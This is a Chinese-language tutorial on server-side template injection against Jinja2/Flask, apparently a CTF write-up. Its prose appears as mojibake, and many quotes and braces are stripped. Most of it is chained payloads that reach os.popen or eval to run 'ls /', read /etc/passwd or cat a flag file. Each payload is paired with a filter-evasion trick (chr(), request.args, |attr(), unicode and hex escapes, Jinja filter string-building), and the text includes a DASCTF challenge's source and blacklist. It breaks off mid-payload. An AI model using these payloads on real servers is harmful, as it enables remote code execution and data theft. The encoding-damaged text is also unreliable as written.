[__builtins__][eval]()().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[__builtins__][eval](__import__(os).popen(ls /).read()) è¿‡æ»¤äº†å¼•å·åˆ©ç”¨chr()ç»•è¿‡ å…ˆè·å–chr()å‡½æ•°ï¼Œèµ‹å€¼ç»™chrï¼Œåé¢å†æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸² % set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()# % set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read() ç­‰åŒäº ().__class__.__bases__[0].__subclasses__().pop(40)(/etc/passwd).read() åˆ©ç”¨requestå¯¹è±¡ç»•è¿‡ ç¤ºä¾‹ï¼š ().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()path=/etc/passwdï¼ˆåªèƒ½getï¼‰().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.values.cmd).read()os=oscmd=ls /ï¼ˆget/postéƒ½å¯ä»¥ï¼‰ ç­‰åŒäºï¼š ().__class__.__bases__[0].__subclasses__().pop(40)(/etc/passwd).read()().__class__.__base__.__subclasses__()[77].__init__.__globals__[os].popen(ls /).read() å¦‚æœè¿‡æ»¤äº†argsï¼Œå¯ä»¥å°†å…¶ä¸­çš„request.argsæ”¹ä¸ºrequest.valuesï¼ŒPOSTå’ŒGETä¸¤ç§æ–¹æ³•ä¼ é€’çš„æ•°æ®request.valueséƒ½å¯ä»¥æ¥æ”¶ è¿‡æ»¤äº†ä¸‹åˆ’çº¿__åˆ©ç”¨requestå¯¹è±¡ç»•è¿‡ ()[request.args.class][request.args.bases][0][request.args.subclasses]()[40](/flag).read()class=__class__bases=__bases__subclasses=__subclasses__()[request.args.class][request.args.bases][0][request.args.subclasses]()[77].__init__.__globals__[os].popen(ls /).read()class=__class__bases=__bases__subclasses=__subclasses__ ç­‰åŒäºï¼š ().__class__.__bases__[0].__subclasses__().pop(40)(/etc/passwd).read()().__class__.__base__.__subclasses__()[77].__init__.__globals__[os].popen(ls /).read() è¿˜æœ‰ä¸€ç§ç¼–ç ç»•è¿‡ __class__ = \\x5f\\x5fclass\\x5f\\x5f å…¶ä¸­_çš„åå…­è¿›åˆ¶ç¼–ç ä¸º\\x5fï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºå¦‚ä¸‹çš„payloadï¼š ().__class__.__bases__[0].__subclasses__()[154].__init__.__globals__[popen](ls /).read() ()|attr(\\x5f\\x5fclass\\x5f\\x5f)|attr(\\x5f\\x5fbase\\x5f\\x5f)|attr(\\x5f\\x5fsubclasses\\x5f\\x5f)()|attr(\\x5f\\x5fgetitem\\x5f\\x5f)(154)|attr(\\x5f\\x5finit\\x5f\\x5f)|attr(\\x5f\\x5fglobals\\x5f\\x5f)|attr(\\x5f\\x5fgetitem\\x5f\\x5f)(popen)(ls /)|attr(read)() è¿‡æ»¤äº†ç‚¹ .åˆ©ç”¨ |attr() ç»•è¿‡ï¼ˆé€‚ç”¨äºflaskï¼‰ å¦‚æœ . ä¹Ÿè¢«è¿‡æ»¤ï¼Œä¸”ç›®æ ‡æ˜¯JinJa2ï¼ˆflaskï¼‰çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨åŸç”ŸJinJa2å‡½æ•°attr()ï¼Œå³ï¼š ().__class__ = ()|attr(__class__) ç¤ºä¾‹ï¼š ()|attr(__class__)|attr(__base__)|attr(__subclasses__)()|attr(__getitem__)(77)|attr(__init__)|attr(__globals__)|attr(__getitem__)(os)|attr(popen)(ls /)|attr(read)() ç­‰åŒäºï¼š ().__class__.__base__.__subclasses__()[77].__init__.__globals__[os].popen(ls /).read() åˆ©ç”¨ä¸­æ‹¬å·[ ]ç»•è¿‡ å¦‚ä¸‹ç¤ºä¾‹ï¼š [__class__][__bases__][0][__subclasses__]()[59][__init__][__globals__][__builtins__][eval](__import__(os).popen(ls).read()) ç­‰åŒäºï¼š ().__class__.__bases__.[0].__subclasses__().[59].__init__[__globals__][__builtins__].eval(__import__(os).popen(ls /).read()) è¿™æ ·çš„è¯ï¼Œé‚£ä¹ˆ __class__ã€__bases__ ç­‰å…³é”®å­—å°±æˆäº†å­—ç¬¦ä¸²ï¼Œå°±éƒ½å¯ä»¥ç”¨å‰é¢æ‰€è®²çš„å…³é”®å­—ç»•è¿‡çš„å§¿åŠ¿è¿›è¡Œç»•è¿‡äº†ã€‚ ().__class__.__bases__[0].__subclasses__()[158].__init__.__globals__[__builtins__][eval](__import__(os).popen(ls /).read())()[__class__][__bases__][0][__subclasses__][158][__init__][__globals__][eval](__import__(os)[popen(ls /)][read()]) è¿‡æ»¤äº†å¤§æ‹¬å·å¯ä»¥ä½¿ç”¨ % if ... %1% endif % é…åˆ os.popen å’Œ curl å°†æ‰§è¡Œç»“æœå¤–å¸¦ï¼ˆä¸å¤–å¸¦çš„è¯æ— å›æ˜¾ï¼‰å‡ºæ¥ï¼š % if .__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(ls /) %1% endif % ä¹Ÿå¯ä»¥ç”¨ %print(......)% çš„å½¢å¼æ¥ä»£æ›¿å¤§æ‹¬å·ï¼Œå¦‚ä¸‹ï¼š %print(.__class__.__base__.__subclasses__()[77].__init__.__globals__[os].popen(ls).read())% åˆ©ç”¨ |attr() æ¥Bypassè¿™é‡Œè¯´ä¸€ä¸ªæ–°ä¸œè¥¿ï¼Œå°±æ˜¯åŸç”ŸJinJa2å‡½æ•° attr()ï¼Œè¿™æ˜¯ä¸€ä¸ª attr() è¿‡æ»¤å™¨ï¼Œå®ƒåªæŸ¥æ‰¾å±æ€§ï¼Œè·å–å¹¶è¿”å›å¯¹è±¡çš„å±æ€§çš„å€¼ï¼Œè¿‡æ»¤å™¨ä¸å˜é‡ç”¨ç®¡é“ç¬¦å·ï¼ˆ | ï¼‰åˆ†å‰²ã€‚å¦‚ï¼š foo|attr(bar) ç­‰åŒäº foo[bar] |attr() é…åˆå…¶ä»–å§¿åŠ¿å¯åŒæ—¶ç»•è¿‡åŒä¸‹åˆ’çº¿ __ ã€å¼•å·ã€ç‚¹ . å’Œ [ ç­‰ï¼Œä¸‹é¢ç»™å‡ºç¤ºä¾‹ã€‚ åŒæ—¶è¿‡æ»¤äº† . å’Œ []è¿‡æ»¤äº†ä»¥ä¸‹å­—ç¬¦ï¼š. [ ç»•è¿‡å§¿åŠ¿ï¼š ()|attr(__class__)|attr(__base__)|attr(__subclasses__)()|attr(__getitem__)(77)|attr(__init__)|attr(__globals__)|attr(__getitem__)(os)|attr(popen)(ls)|attr(read)() ç­‰åŒäºï¼š ().__class__.__base__.__subclasses__()[77].__init__.__globals__[os].popen(ls).read() åŒæ—¶è¿‡æ»¤äº† __ ã€ç‚¹. å’Œ []è¿‡æ»¤äº†ä»¥ä¸‹å­—ç¬¦ï¼š __ . [ ä¸‹é¢æˆ‘ä»¬æ¼”ç¤ºç»•è¿‡å§¿åŠ¿ï¼Œå…ˆå†™å‡ºpayloadçš„åŸå‹ï¼š ().__class__.__base__.__subclasses__()[77].__init__.__globals__[__builtins__][eval](__import__(os).popen(ls /).read()) ç”±äºä¸­æ‹¬å· [ è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ __getitem__() æ¥ç»•è¿‡ï¼ˆå°½é‡ä¸è¦ç”¨pop()ï¼‰ï¼Œç±»ä¼¼å¦‚ä¸‹ï¼š ().__class__.__base__.__subclasses__().__getitem__(77).__init__.__globals__.__getitem__(__builtins__).__getitem__(eval)(__import__(os).popen(ls /).read()) ç”±äºè¿˜è¿‡æ»¤äº†ä¸‹åˆ’çº¿ __ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨requestå¯¹è±¡ç»•è¿‡ï¼Œä½†æ˜¯è¿˜è¿‡æ»¤äº†ä¸­æ‹¬å· []ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åŒæ—¶ç»•è¿‡ __ å’Œ [ï¼Œå°±ç”¨åˆ°äº†æˆ‘ä»¬çš„|attr() æ‰€ä»¥æœ€ç»ˆçš„payloadå¦‚ä¸‹ï¼š ()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)x1=__class__x2=__base__x3=__subclasses__x4=__getitem__x5=__init__x6=__globals__x7=__builtins__x8=evalx9=__import__(os).popen(ls /).read() åŒæ—¶è¿‡æ»¤äº† __ ã€ç‚¹. å’Œ []è¿‡æ»¤äº†ä»¥ä¸‹å­—ç¬¦ï¼š __ . [ ä¸‹é¢æˆ‘ä»¬æ¼”ç¤ºç»•è¿‡å§¿åŠ¿ï¼Œå…ˆå†™å‡ºpayloadçš„åŸå‹ï¼š ().__class__.__base__.__subclasses__()[77].__init__.__globals__[__builtins__][eval](__import__(os).popen(ls /).read()) ç”±äºä¸­æ‹¬å· [ è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ __getitem__() æ¥ç»•è¿‡ï¼ˆå°½é‡ä¸è¦ç”¨pop()ï¼‰ï¼Œç±»ä¼¼å¦‚ä¸‹ï¼š ().__class__.__base__.__subclasses__().__getitem__(77).__init__.__globals__.__getitem__(__builtins__).__getitem__(eval)(__import__(os).popen(ls /).read()) ç”±äºè¿˜è¿‡æ»¤äº†ä¸‹åˆ’çº¿ __ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨requestå¯¹è±¡ç»•è¿‡ï¼Œä½†æ˜¯è¿˜è¿‡æ»¤äº†ä¸­æ‹¬å· []ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åŒæ—¶ç»•è¿‡ __ å’Œ [ï¼Œå°±ç”¨åˆ°äº†æˆ‘ä»¬çš„|attr() æ‰€ä»¥æœ€ç»ˆçš„payloadå¦‚ä¸‹ï¼š ()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)x1=__class__x2=__base__x3=__subclasses__x4=__getitem__x5=__init__x6=__globals__x7=__builtins__x8=evalx9=__import__(os).popen(ls /).read() ç”¨Unicodeç¼–ç é…åˆ |attr() è¿›è¡ŒBypassè¿‡æ»¤äº†ä»¥ä¸‹å­—ç¬¦ï¼š request _ %20(ç©ºæ ¼) [ ] . __globals__ __getitem__ æˆ‘ä»¬ç”¨ %print(......)%ç»•è¿‡å¯¹ ` çš„è¿‡æ»¤ï¼Œå¹¶ç”¨unicodeç»•è¿‡å¯¹å…³é”®å­—çš„è¿‡æ»¤ã€‚unicodeç»•è¿‡æ˜¯ä¸€ç§ç½‘ä¸Šæ²¡æå‡ºçš„æ–¹æ³•ã€‚ å‡è®¾æˆ‘ä»¬è¦æ„é€ çš„payloadåŸå‹ä¸ºï¼š ().__class__.__base__.__subclasses__()[77].__init__.__globals__[os].popen(ls).read() å…ˆç”¨ `|attr` ç»•è¿‡ `.` å’Œ `[]`ï¼š ()|attr(__class__)|attr(__base__)|attr(__subclasses__)()|attr(__getitem__)(77)|attr(__init__)|attr(__globals__)|attr(__getitem__)(os)|attr(popen)(ls)|attr(read)() æˆ‘ä»¬å¯ä»¥å°†è¿‡æ»¤æ‰çš„å­—ç¬¦ç”¨unicodeæ›¿æ¢æ‰ï¼š ()|attr(\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f)|attr(\\u005f\\u005f\\u0062\\u0061\\u0073\\u0065\\u005f\\u005f)|attr(\\u005f\\u005f\\u0073\\u0075\\u0062\\u0063\\u006c\\u0061\\u0073\\u0073\\u0065\\u0073\\u005f\\u005f)()|attr(\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f)(77)|attr(\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f)|attr(\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f)|attr(\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f)(os)|attr(popen)(ls)|attr(read)() ### ç”¨Hexç¼–ç é…åˆ `|attr()` è¿›è¡ŒBypass å’Œä¸Šé¢é‚£ä¸ªä¸€æ ·ï¼Œåªä¸è¿‡æ˜¯å°†Unicodeç¼–ç æ¢æˆäº†Hexç¼–ç ï¼Œé€‚ç”¨äºâ€œuâ€è¢«è¿‡æ»¤äº†çš„æƒ…å†µã€‚ æˆ‘ä»¬å¯ä»¥å°†è¿‡æ»¤æ‰çš„å­—ç¬¦ç”¨Hexç¼–ç æ›¿æ¢æ‰ï¼š ()|attr(\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f)|attr(\\x5f\\x5f\\x62\\x61\\x73\\x65\\x5f\\x5f)|attr(\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f)()|attr(\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f)(258)|attr(\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f)|attr(\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f)|attr(\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f)(os)|attr(popen)(cat\\x20\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74)|attr(read)() ## ä½¿ç”¨ JinJa çš„è¿‡æ»¤å™¨è¿›è¡ŒBypass åœ¨ Flask JinJa ä¸­ï¼Œå†…åªæœ‰å¾ˆå¤šè¿‡æ»¤å™¨å¯ä»¥ä½¿ç”¨ï¼Œå‰æ–‡çš„attr()å°±æ˜¯å…¶ä¸­çš„ä¸€ä¸ªè¿‡æ»¤å™¨ã€‚å˜é‡å¯ä»¥é€šè¿‡è¿‡æ»¤å™¨è¿›è¡Œä¿®æ”¹ï¼Œè¿‡æ»¤å™¨ä¸å˜é‡ä¹‹é—´ç”¨ç®¡é“ç¬¦å·ï¼ˆ|ï¼‰éš”å¼€ï¼Œæ‹¬å·ä¸­å¯ä»¥æœ‰å¯é€‰å‚æ•°ï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰å‚æ•°ï¼Œè¿‡æ»¤å™¨å‡½æ•°å¯ä»¥å¸¦æ‹¬å·ä¹Ÿå¯ä»¥ä¸å¸¦æ‹¬å·ã€‚å¯ä»¥ä½¿ç”¨ç®¡é“ç¬¦å·ï¼ˆ|ï¼‰è¿æ¥å¤šä¸ªè¿‡æ»¤å™¨ï¼Œä¸€ä¸ªè¿‡æ»¤å™¨çš„è¾“å‡ºåº”ç”¨äºä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨ã€‚ è¯¦æƒ…è¯·çœ‹å®˜æ–¹æ–‡æ¡£ï¼šhttps://jinja.palletsprojects.com/en/master/templates/#builtin-filters ä»¥ä¸‹æ˜¯å†…ç½®çš„æ‰€æœ‰çš„è¿‡æ»¤å™¨åˆ—è¡¨ï¼š | [`abs()`](https://jinja.palletsprojects.com/en/master/templates/#abs) | [`float()`](https://jinja.palletsprojects.com/en/master/templates/#float) | [`lower()`](https://jinja.palletsprojects.com/en/master/templates/#lower) | [`round()`](https://jinja.palletsprojects.com/en/master/templates/#round) | [`tojson()`](https://jinja.palletsprojects.com/en/master/templates/#tojson) | | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | | [`attr()`](https://jinja.palletsprojects.com/en/master/templates/#attr) | [`forceescape()`](https://jinja.palletsprojects.com/en/master/templates/#forceescape) | [`map()`](https://jinja.palletsprojects.com/en/master/templates/#map) | [`safe()`](https://jinja.palletsprojects.com/en/master/templates/#safe) | [`trim()`](https://jinja.palletsprojects.com/en/master/templates/#trim) | | [`batch()`](https://jinja.palletsprojects.com/en/master/templates/#batch) | [`format()`](https://jinja.palletsprojects.com/en/master/templates/#format) | [`max()`](https://jinja.palletsprojects.com/en/master/templates/#max) | [`select()`](https://jinja.palletsprojects.com/en/master/templates/#select) | [`truncate()`](https://jinja.palletsprojects.com/en/master/templates/#truncate) | | [`capitalize()`](https://jinja.palletsprojects.com/en/master/templates/#capitalize) | [`groupby()`](https://jinja.palletsprojects.com/en/master/templates/#groupby) | [`min()`](https://jinja.palletsprojects.com/en/master/templates/#min) | [`selectattr()`](https://jinja.palletsprojects.com/en/master/templates/#selectattr) | [`unique()`](https://jinja.palletsprojects.com/en/master/templates/#unique) | | [`center()`](https://jinja.palletsprojects.com/en/master/templates/#center) | [`indent()`](https://jinja.palletsprojects.com/en/master/templates/#indent) | [`pprint()`](https://jinja.palletsprojects.com/en/master/templates/#pprint) | [`slice()`](https://jinja.palletsprojects.com/en/master/templates/#slice) | [`upper()`](https://jinja.palletsprojects.com/en/master/templates/#upper) | | [`default()`](https://jinja.palletsprojects.com/en/master/templates/#default) | [`int()`](https://jinja.palletsprojects.com/en/master/templates/#int) | [`random()`](https://jinja.palletsprojects.com/en/master/templates/#random) | [`sort()`](https://jinja.palletsprojects.com/en/master/templates/#sort) | [`urlencode()`](https://jinja.palletsprojects.com/en/master/templates/#urlencode) | | [`dictsort()`](https://jinja.palletsprojects.com/en/master/templates/#dictsort) | [`join()`](https://jinja.palletsprojects.com/en/master/templates/#join) | [`reject()`](https://jinja.palletsprojects.com/en/master/templates/#reject) | [`string()`](https://jinja.palletsprojects.com/en/master/templates/#string) | [`urlize()`](https://jinja.palletsprojects.com/en/master/templates/#urlize) | | [`escape()`](https://jinja.palletsprojects.com/en/master/templates/#escape) | [`last()`](https://jinja.palletsprojects.com/en/master/templates/#last) | [`rejectattr()`](https://jinja.palletsprojects.com/en/master/templates/#rejectattr) | [`striptags()`](https://jinja.palletsprojects.com/en/master/templates/#striptags) | [`wordcount()`](https://jinja.palletsprojects.com/en/master/templates/#wordcount) | | [`filesizeformat()`](https://jinja.palletsprojects.com/en/master/templates/#filesizeformat) | [`length()`](https://jinja.palletsprojects.com/en/master/templates/#length) | [`replace()`](https://jinja.palletsprojects.com/en/master/templates/#replace) | [`sum()`](https://jinja.palletsprojects.com/en/master/templates/#sum) | [`wordwrap()`](https://jinja.palletsprojects.com/en/master/templates/#wordwrap) | | [`first()`](https://jinja.palletsprojects.com/en/master/templates/#first) | [`list()`](https://jinja.palletsprojects.com/en/master/templates/#list) | [`reverse()`](https://jinja.palletsprojects.com/en/master/templates/#reverse) | [`title()`](https://jinja.palletsprojects.com/en/master/templates/#title) | [`xmlattr()`](https://jinja.palletsprojects.com/en/master/templates/#xmlattr) | å¯ä»¥è‡ªè¡Œç‚¹å‡»æ¯ä¸ªè¿‡æ»¤å™¨å»æŸ¥çœ‹æ¯ä¸€ç§è¿‡æ»¤å™¨çš„ä½œç”¨ã€‚æˆ‘ä»¬å°±æ˜¯åˆ©ç”¨è¿™äº›è¿‡æ»¤å™¨ï¼Œä¸€æ­¥æ­¥çš„æ‹¼æ¥å‡ºæˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦ã€æ•°å­—æˆ–å­—ç¬¦ä¸²ã€‚ ### å¸¸ç”¨å­—ç¬¦è·å–å…¥å£ç‚¹ - å¯¹äºè·å–ä¸€èˆ¬å­—ç¬¦çš„æ–¹æ³•æœ‰ä»¥ä¸‹å‡ ç§ï¼š % set org = ( |select()|string()) %org% set org = (self|string()) %org% set org = self|string|urlencode %org% set org = (app.__doc__|string) %org å¦‚ä¸‹æ¼”ç¤ºï¼š % set org = ( |select()|string()) %org å¯ä»¥é€šè¿‡ä¸Šé¢è·å–åˆ°çš„ `` å­—ç¬¦ä¸²è·å–çš„å­—ç¬¦æœ‰ï¼šå°–å·ã€å­—æ¯ã€ç©ºæ ¼ã€ä¸‹åˆ’çº¿å’Œæ•°å­—ã€‚ % set org = (self|string()) %org å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¯ä»¥é€šè¿‡ `` å­—ç¬¦ä¸²è·å–çš„å­—ç¬¦æœ‰ï¼šå°–å·ã€å­—æ¯å’Œç©ºæ ¼ã€‚ % set org = self|string|urlencode %org å¯ä»¥é€šè¿‡ä¸Šé¢è·å–åˆ°çš„é™¤äº†å­—æ¯ä»¥å¤–è¿˜æœ‰ç™¾åˆ†å·ï¼Œè¿™ä¸€ç‚¹æ¯”è¾ƒé‡è¦ï¼Œå› ä¸ºå¦‚æœæˆ‘ä»¬æ§åˆ¶äº†ç™¾åˆ†å·çš„è¯æˆ‘ä»¬å¯ä»¥è·å–ä»»æ„å­—ç¬¦ % set org = (app.__doc__|string) %org å¯è·å¾—åˆ°çš„å­—ç¬¦æ›´å¤šäº†ã€‚ - å¯¹äºè·å–æ•°å­—ï¼Œé™¤äº†ä¸Šé¢å‡ºç°çš„é‚£å‡ ç§å¤–æˆ‘ä»¬è¿˜å¯ä»¥æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š % set num = (self|int) %num # 0, é€šè¿‡intè¿‡æ»¤å™¨è·å–æ•°å­—% set num = (self|string|length) %num # 24, é€šè¿‡lengthè¿‡æ»¤å™¨è·å–æ•°å­—% set point = self|float|string|min % # é€šè¿‡floatè¿‡æ»¤å™¨è·å–ç‚¹ .% set num = (True|int) % #å¾—åˆ°1 æ¯”å¦‚ï¼š`code=% set a='aaaaaaaaaaa'|length*'aa'|length*'aaaaaaa'|length %aå¾—åˆ°154 æœ‰äº†æ•°å­—0ä¹‹åï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ä¾æ¬¡å°†å…¶ä½™çš„æ•°å­—å…¨éƒ¨æ„é€ å‡ºæ¥ï¼ŒåŸç†å°±æ˜¯åŠ å‡ä¹˜é™¤ã€å¹³æ–¹ç­‰æ•°å­¦è¿ç®—ã€‚ [2020 DASCTF å…«æœˆå®‰æ’æœˆèµ›]ezflaské¢˜ç›®æºç ï¼š #!/usr/bin/env python# -*- coding: utf-8 -*-from flask import Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directoryapp = Flask(__name__)@app.route(/)def index(): def safe_jinja(s): blacklist = [class, attr, mro, base, request, session, +, add, chr, ord, redirect, url_for, config, builtins, get_flashed_messages, get, subclasses, form, cookies, headers, [, ], \\, , ] flag = True for no in blacklist: if no.lower() in s.lower(): flag = False break return flag if not request.args.get(name): return open(__file__).read() elif safe_jinja(request.args.get(name)): name = request.args.get(name) else: name = wendell template = div class=center-content pHello, %s/p /div !--flag in /flag-- !--python3.8-- % (name) return render_template_string(template)if __name__ == __main__: app.run(host=0.0.0.0, port=5000) å¯ä»¥çœ‹åˆ°é¢˜ç›®è¿‡æ»¤çš„æ­»æ­»åœ°ï¼Œæœ€å…³é”®æ˜¯æŠŠatträ¹Ÿç»™è¿‡æ»¤äº†çš„è¯ï¼Œè¿™å°±å¾ˆéº»çƒ¦äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥ç”¨è¿‡æ»¤å™¨è¿›è¡Œç»•è¿‡ã€‚ åœ¨å­˜åœ¨sstiçš„åœ°æ–¹æ‰§è¡Œå¦‚ä¸‹payloadï¼š % set org = ( |select()|string()) %org# æˆ– % set org = ( |select|string) %org å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€æ®µå­—ç¬¦ä¸²ï¼šgenerator object select_or_reject at 0x7f06771f4150ï¼Œè¿™æ®µå­—ç¬¦ä¸²ä¸­ä¸ä»…å­˜åœ¨å­—ç¬¦ï¼Œè¿˜å­˜åœ¨ç©ºæ ¼ã€ä¸‹åˆ’çº¿ï¼Œå°–å·å’Œæ•°å­—ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœé¢˜ç›®è¿‡æ»¤äº†è¿™äº›å­—ç¬¦çš„è¯ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥åœ¨ generator object select_or_reject at 0x7f06771f4150 è¿™ä¸ªå­—ç¬¦ä¸²ä¸­å–åˆ°æˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦ï¼Œä»è€Œç»•è¿‡è¿‡æ»¤ã€‚ ç„¶åæˆ‘ä»¬åœ¨ä½¿ç”¨list()è¿‡æ»¤å™¨å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºåˆ—è¡¨ï¼š % set orglst = ( |select|string|list) %orglst å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œåå›äº†ä¸€ä¸ªåˆ—è¡¨ï¼Œåˆ—è¡¨ä¸­æ˜¯ generator object select_or_reject at 0x7f06771f4150 è¿™ä¸ªå­—ç¬¦ä¸²çš„æ¯ä¸€ä¸ªå­—ç¬¦ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨ä½¿ç”¨pop()ç­‰æ–¹æ³•å°†åˆ—è¡¨é‡Œçš„å­—ç¬¦å–å‡ºæ¥äº†ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œæˆ‘ä»¬å–ä¸€ä¸ªä¸‹åˆ’çº¿ _ï¼š % set xhx = (( |select|string|list).pop(24)|string) %xhx # _ åŒç†è¿˜èƒ½å–åˆ°æ›´å¤šçš„å­—ç¬¦ï¼š % set space = (( |select|string|list).pop(10)|string) %spa # ç©ºæ ¼% set xhx = (( |select|string|list).pop(24)|string) %xhx # _% set zero = (( |select|string|list).pop(38)|int) %zero # 0% set seven = (( |select|string|list).pop(40)|int) %seven # 7...... è¿™é‡Œï¼Œå…¶å®æœ‰äº†æ•°å­—0ä¹‹åï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ä¾æ¬¡å°†å…¶ä½™çš„æ•°å­—å…¨éƒ¨æ„é€ å‡ºæ¥ï¼ŒåŸç†å°±æ˜¯åŠ å‡ä¹˜é™¤ã€å¹³æ–¹ç­‰æ•°å­¦è¿ç®—ï¼Œå¦‚ä¸‹ç¤ºä¾‹ï¼š % set zero = (( |select|string|list).pop(38)|int) % # 0% set one = (zero**zero)|int %one # 1%set two = (zero-one-one)|abs % # 2%set three = (zero-one-one-one)|abs % # 3% set five = (two*two*two)-one-one-one % # 5# %set four = (one+three) % æ³¨æ„, è¿™æ ·çš„åŠ å·çš„æ˜¯ä¸è¡Œçš„,ä¸çŸ¥é“ä¸ºä»€ä¹ˆ,åªèƒ½ç”¨å‡å·é…åˆabså–ç»å¯¹å€¼äº†...... é€šè¿‡ä¸Šè¿°åŸç†ï¼Œæˆ‘ä»¬å¯ä»¥ä¾æ¬¡è·å¾—æ„é€ payloadæ‰€éœ€çš„ç‰¹æ®Šå­—ç¬¦ä¸å­—ç¬¦ä¸²ï¼š # é¦–å…ˆæ„é€ å‡ºæ‰€éœ€çš„æ•°å­—:% set zero = (( |select|string|list).pop(38)|int) % # 0% set one = (zero**zero)|int % # 1% set two = (zero-one-one)|abs % # 2% set four = (two*two)|int % # 4% set five = (two*two*two)-one-one-one % # 5% set seven = (zero-one-one-five)|abs % # 7# æ„é€ å‡ºæ‰€éœ€çš„å„ç§å­—ç¬¦ä¸å­—ç¬¦ä¸²:% set xhx = (( |select|string|list).pop(24)|string) % # _% set space = (( |select|string|list).pop(10)|string) % # ç©ºæ ¼% set point = ((app.__doc__|string|list).pop(26)|string) % # .% set yin = ((app.__doc__|string|list).pop(195)|string) % # å•å¼•å· % set left = ((app.__doc__|string|list).pop(189)|string) % # å·¦æ‹¬å· (% set right = ((app.__doc__|string|list).pop(200)|string) % # å³æ‹¬å· )% set c = dict(c=aa)|reverse|first % # å­—ç¬¦ c% set bfh = self|string|urlencode|first % # ç™¾åˆ†å· %% set bfhc=bfh~c % # è¿™é‡Œæ„é€ äº†%c, ä¹‹åå¯ä»¥åˆ©ç”¨è¿™ä¸ª%cæ„é€ ä»»æ„å­—ç¬¦ã€‚~ç”¨äºå­—ç¬¦è¿æ¥% set slas = bfhc%((four~seven)|int) % # ä½¿ç”¨%cæ„é€ æ–œæ  /ï¼Œä½¿ç”¨æŸç§æ ¼å¼åŒ–æ“ä½œï¼ˆ%cï¼‰ï¼Œè¿™åœ¨å¾ˆå¤šç¼–ç¨‹è¯­è¨€ä¸­ç”¨äºå°†ä¸€ä¸ªæ•´æ•°è½¬æ¢ä¸ºå…¶å¯¹åº”çš„å­—ç¬¦ã€‚åœ¨ASCIIç è¡¨ä¸­ï¼Œæ•´æ•° 47 å¯¹åº”çš„å­—ç¬¦æ˜¯æ–œæ ï¼ˆ/ï¼‰% set but = dict(buil=aa,tins=dd)|join % # builtins% set imp = dict(imp=aa,ort=dd)|join % # import% set pon = dict(po=aa,pen=dd)|join % # popen% set os = dict(o=aa,s=dd)|join % # os% set ca = dict(ca=aa,t=dd)|join % # cat% set flg = dict(fl=aa,ag=dd)|join % # flag% set ev = dict(ev=aa,al=dd)|join % # eval% set red = dict(re=aa,ad=dd)|join % # read% set bul = xhx*2~but~xhx*2 % # __builtins__ å°†ä¸Šé¢æ„é€ çš„å­—ç¬¦æˆ–å­—ç¬¦ä¸²æ‹¼æ¥èµ·æ¥æ„é€ å‡º __import__(os).popen(cat 